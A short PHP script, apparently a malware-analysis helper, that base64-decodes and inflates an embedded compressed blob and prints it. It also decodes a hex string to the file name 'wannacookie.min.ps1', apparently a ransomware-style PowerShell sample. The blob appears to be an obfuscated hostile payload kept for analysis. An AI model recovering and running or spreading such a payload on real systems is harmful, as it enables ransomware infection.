<?php

/*
docker run -it --rm --name my-running-script -v "$PWD":/usr/src/myapp -w /usr/src/myapp php:7.2-cli
*/
$payload = "lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG";
$binary = base64_decode($payload);
$uncompressed = gzinflate($binary);
var_dump($uncompressed);

$wanacookie = "77616E6E61636F6F6B69652E6D696E2E707331";


function Hex2String($hex){
   $string='';
   for ($i=0; $i < strlen($hex)-1; $i+=2){
       $string .= chr(hexdec($hex[$i].$hex[$i+1]));
   }
   return $string;
}

var_dump(Hex2String($wanacookie));

?>
